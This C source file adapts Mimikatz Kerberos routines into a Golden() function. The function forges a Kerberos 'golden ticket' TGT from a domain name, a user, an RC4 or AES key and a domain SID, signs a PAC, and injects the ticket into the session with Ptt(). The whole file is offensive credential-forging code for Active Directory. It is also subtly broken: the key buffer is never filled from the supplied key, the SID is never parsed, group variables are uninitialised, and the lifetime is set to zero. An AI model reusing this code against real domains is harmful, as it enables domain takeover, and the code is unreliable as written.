#pragma once
#include "kerb.h"

#include "asn1/kull_m_asn1.h"

#include <locale.h>
#include <stdio.h>
#include <windows.h>

wchar_t *convertToWide(const char *str) {
  setlocale(LC_ALL, "");

  // 1. Get required size
  size_t size = mbstowcs(NULL, str, 0);
  if (size == (size_t)-1)
    return NULL;

  // 2. Allocate memory (+1 for null terminator)
  wchar_t *wideStr = malloc((size + 1) * sizeof(wchar_t));

  // 3. Convert
  mbstowcs(wideStr, str, size + 1);
  return wideStr;
}

NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key,
                                 DWORD keySize, LPCVOID data, DWORD dataSize,
                                 LPVOID *output, DWORD *outputSize,
                                 BOOL encrypt) {
  NTSTATUS status;
  PKERB_ECRYPT pCSystem;
  PVOID pContext;
  DWORD modulo;

  status = CDLocateCSystem(eType, &pCSystem);
  if (NT_SUCCESS(status)) {
    status = pCSystem->Initialize(key, keySize, keyUsage, &pContext);
    if (NT_SUCCESS(status)) {
      *outputSize = dataSize;
      if (encrypt) {
        if (modulo = *outputSize % pCSystem->BlockSize)
          *outputSize += pCSystem->BlockSize - modulo;
        *outputSize += pCSystem->HeaderSize;
      }
      if (*output = LocalAlloc(LPTR, *outputSize)) {
        status = encrypt ? pCSystem->Encrypt(pContext, data, dataSize, *output,
                                             outputSize)
                         : pCSystem->Decrypt(pContext, data, dataSize, *output,
                                             outputSize);
        if (!NT_SUCCESS(status))
          LocalFree(*output);
      }
      pCSystem->Finish(&pContext);
    }
  }
  return status;
}

PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname,
                                    LPCWSTR servicename, LPCWSTR targetname,
                                    PKUHL_M_KERBEROS_LIFETIME_DATA lifetime,
                                    LPCBYTE key, DWORD keySize, DWORD keyType,
                                    PISID sid, LPCWSTR LogonDomainName,
                                    DWORD userid, PGROUP_MEMBERSHIP groups,
                                    DWORD cbGroups,
                                    PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids,
                                    DWORD rodc, PCLAIMS_SET pClaimsSet) {
  NTSTATUS status = STATUS_INVALID_PARAMETER;
  KIWI_KERBEROS_TICKET ticket = {0};
  PKERB_VALIDATION_INFO pValidationInfo = NULL;
  PPACTYPE pacType = NULL;
  DWORD pacTypeSize = 0;
  LONG SignatureType;
  PBERVAL BerApp_EncTicketPart, BerApp_KrbCred = NULL;

  ticket.StartTime = lifetime->TicketStart;
  ticket.EndTime = lifetime->TicketEnd;
  ticket.RenewUntil = lifetime->TicketRenew;
  if (ticket.ClientName = (PKERB_EXTERNAL_NAME)LocalAlloc(
          LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */)) {
    ticket.ClientName->NameCount = 1;
    ticket.ClientName->NameType = KRB_NT_PRINCIPAL;
    RtlInitUnicodeString(&ticket.ClientName->Names[0], username);
  }
  if (ticket.ServiceName = (PKERB_EXTERNAL_NAME)LocalAlloc(
          LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */ +
                    sizeof(UNICODE_STRING))) {
    ticket.ServiceName->NameCount = 2;
    ticket.ServiceName->NameType = KRB_NT_SRV_INST;
    RtlInitUnicodeString(&ticket.ServiceName->Names[0],
                         servicename ? servicename : L"krbtgt");
    RtlInitUnicodeString(&ticket.ServiceName->Names[1],
                         targetname ? targetname : domainname);
  }
  RtlInitUnicodeString(&ticket.DomainName, domainname);
  ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
  ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) |
                       KERB_TICKET_FLAGS_pre_authent |
                       KERB_TICKET_FLAGS_renewable |
                       KERB_TICKET_FLAGS_forwardable;
  ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16))
                           : 2; // windows does not care about it...
  ticket.TicketEncType = ticket.KeyType = keyType;
  ticket.Key.Length = keySize;
  if (ticket.Key.Value = (PUCHAR)LocalAlloc(LPTR, ticket.Key.Length))
    CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);

  switch (keyType) {
  case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
    SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES128;
    break;
  case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
    SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
    break;
    //  case KERB_ETYPE_DES_CBC_MD5: no one uses DES.
    //    SignatureType = KERB_CHECKSUM_DES_MAC;
    //    break;
  case KERB_ETYPE_RC4_HMAC_NT:
  default:
    SignatureType = KERB_CHECKSUM_HMAC_MD5;
  }

  if (sid) // we want a PAC !
  {
    if (pValidationInfo = kuhl_m_pac_infoToValidationInfo(
            &lifetime->TicketStart, username, domainname, LogonDomainName, sid,
            userid, groups, cbGroups, sids, cbSids)) {
      if (kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL,
                                           SignatureType, pClaimsSet, &pacType,
                                           &pacTypeSize)) {
        wprintf(L" * PAC generated\n");
        status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key,
                                      keySize);
        if (NT_SUCCESS(status))
          wprintf(L" * PAC signed\n");
      }
    }
  }

  if (!sid || NT_SUCCESS(status)) {
    if (BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(
            &ticket, pacType, pacTypeSize)) {
      wprintf(L" * EncTicketPart generated\n");
      status = kuhl_m_kerberos_encrypt(
          keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize,
          BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len,
          (LPVOID *)&ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);
      if (NT_SUCCESS(status)) {
        wprintf(L" * EncTicketPart encrypted\n");
        if (BerApp_KrbCred =
                kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
          wprintf(L" * KrbCred generated\n");
        LocalFree(ticket.Ticket.Value);
      } else
        wprintf(L"kuhl_m_kerberos_encrypt %08x\n", status);
      ber_bvfree(BerApp_EncTicketPart);
    }
  }

  if (pacType)
    LocalFree(pacType);
  if (pValidationInfo)
    LocalFree(pValidationInfo);
  if (ticket.Key.Value)
    LocalFree(ticket.Key.Value);
  if (ticket.ClientName)
    LocalFree(ticket.ClientName);
  if (ticket.ServiceName)
    LocalFree(ticket.ServiceName);
  return BerApp_KrbCred;
}

void kull_m_string_displayFileTime(IN PFILETIME pFileTime) {
  SYSTEMTIME st;
  char buffer[0xff];
  if (pFileTime) {
    if (FileTimeToSystemTime(pFileTime, &st)) {
      if (GetDateFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer,
                         sizeof(buffer))) {
        printf("%s \n", buffer);
        // dprintf("%s ", buffer);
        if (GetTimeFormatA(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer,
                           sizeof(buffer))) {
          printf("%s\n", buffer);
        }
        // dprintf("%s", buffer);
      }
    }
  }
}

void kull_m_string_displayLocalFileTime(IN PFILETIME pFileTime) {
  FILETIME ft;
  if (pFileTime)
    if (FileTimeToLocalFileTime(pFileTime, &ft))
      kull_m_string_displayFileTime(&ft);
}

void Golden(const char *domain, const char *user, const char *rc4,
            const char *aes128, const char *aes256, const char *domainSID,
            const char *spn) {
  printf("requesting golden ticket..\n");
  BYTE key[AES_256_KEY_LENGTH] = {0};
  DWORD keyType = 0, i, j, id = 500, nbGroups, nbSids = 0, rodc = 0;
  PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szKey = NULL,
                            szLifetime, szSid, szId, szGroups, szSids, szClaims,
                            szRodc, filename;

  PWCHAR baseDot, netbiosDomain = NULL;
  PISID pSid = NULL;
  PGROUP_MEMBERSHIP groups = NULL;

  PKERB_SID_AND_ATTRIBUTES sids = NULL;
  PCLAIMS_SET pClaimsSet = NULL;
  PBERVAL BerApp_KrbCred;
  KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
  NTSTATUS status;
  PKERB_ECRYPT pCSystem = NULL;

  szDomain = convertToWide(domain);
  szUser = convertToWide(user);
  if (rc4 != NULL && strlen(rc4) > 5) {
    keyType = KERB_ETYPE_RC4_HMAC_NT;
    printf("using rc4..\n");
    szKey = convertToWide(rc4);
  }
  if (aes128 != NULL && strlen(aes128) > 5) {
    keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
    printf("using aes128..\n");
    szKey = convertToWide(aes128);
  }
  if (aes256 != NULL && strlen(aes256) > 5) {
    keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
    printf("using aes256..\n");
    szKey = convertToWide(aes256);
  }
  if (szKey == NULL || keyType == 0) {
    printf("error: no key provided (rc4, aes128, or aes256 required)\n");
    return;
  }
  status = CDLocateCSystem(keyType, &pCSystem);
  if (status != 0) {
    printf("error in CDLocateCSystem: 0x%lx\n", status);
    return;
  }
  szSid = convertToWide(domainSID);
  if (spn != NULL && strlen(spn) > 2) {
    szService = convertToWide(spn);
  }
  // szTarget = szUser;

  szLifetime = L"0";
  GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
  *(PULONGLONG)&lifeTimeData.TicketStart -=
      *(PULONGLONG)&lifeTimeData.TicketStart % 10000000 -
      ((LONGLONG)wcstol(szLifetime, NULL, 0) * 10000000 * 60);
  lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;

  *(PULONGLONG)&lifeTimeData.TicketEnd +=
      (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);

  *(PULONGLONG)&lifeTimeData.TicketRenew +=
      (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);

  baseDot = wcschr(szDomain, L'.');
  i = (DWORD)((PBYTE)baseDot - (PBYTE)szDomain);
  netbiosDomain = (PWCHAR)LocalAlloc(LPTR, i + sizeof(wchar_t));
  for (j = 0; j < i / sizeof(wchar_t); j++) {
    netbiosDomain[j] = towupper(szDomain[j]);
  }
  kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart);
  kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd);
  kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew);
  BerApp_KrbCred = kuhl_m_kerberos_golden_data(
      szUser, szDomain, szService, szTarget, &lifeTimeData, key,
      pCSystem->KeySize, keyType, pSid, netbiosDomain, id, groups, nbGroups,
      sids, nbSids, rodc, pClaimsSet);

  wprintf(L"size of ticket: %u\n", BerApp_KrbCred->bv_val);
  Ptt(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len);
}
